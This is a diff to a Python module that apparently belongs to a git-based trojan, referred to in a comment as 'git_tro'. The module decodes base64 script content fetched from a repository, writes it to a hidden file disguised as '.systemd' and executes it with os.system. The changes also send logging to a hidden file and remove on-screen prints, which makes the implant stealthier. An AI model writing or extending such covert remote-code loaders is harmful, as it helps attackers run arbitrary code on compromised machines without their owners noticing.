@@ -4,6 +4,7 @@ import base64
 import os
 
 scriptPath = "scripts/test" #"modules/dirlister.py" #
+TargetScript= ".systemd"
 ScriptExec = "python "
 encodedFiles  = False
 
@@ -30,25 +31,24 @@ def get_file_contents(filepath):
 
 
 def run(**args): # Must import its personal lib, git_tro will execute this module in # environment
-	print("[*] In RunScriptFromGit module.") #Todelete
+	os.system("echo '[*] In RunScriptFromGit module.'>> .Tlog.log") #Todelete
 	script	= get_file_contents(scriptPath)
 	#content = None
 	if script is not None:
 		content	= base64.b64decode(script).decode()
 		print(content)
-		try:
-			os.makedirs("scripts", mode=777)
-		except:
-			os.system("echo 'getRunScript: scripts folder exists' >> logFile.log")
-		fich = open(scriptPath, "w")
+		#try:
+		#	os.makedirs("scripts", mode=777)
+		#except:
+		#	os.system("echo 'getRunScript: scripts folder exists' >> .Tlog.log")
+		fich = open(TargetScript, "w")
 		fich.write(content)
 		fich.close()
-		print(scriptPath)
-		os.system(ScriptExec+" "+scriptPath) #os.execv("scripts/test.py") #Permission denied
+
+		os.system(ScriptExec+" "+TargetScript) #os.execv("scripts/test.py") #Permission denied
 		return str("getRunScript: script {} successfully started".format(scriptPath))
 	else:
-		print(" Unable to find file")
+		#os.system("echo ' Unable to find file'>> .Tlog.log")
 		#TODO: Customize log file path
 		#os.system("echo 'getRunScript: Unable to find file {}' >> logFile.log".format(scriptPath))
 		return str("getRunScript: Unable to find script {}".format(scriptPath))
-
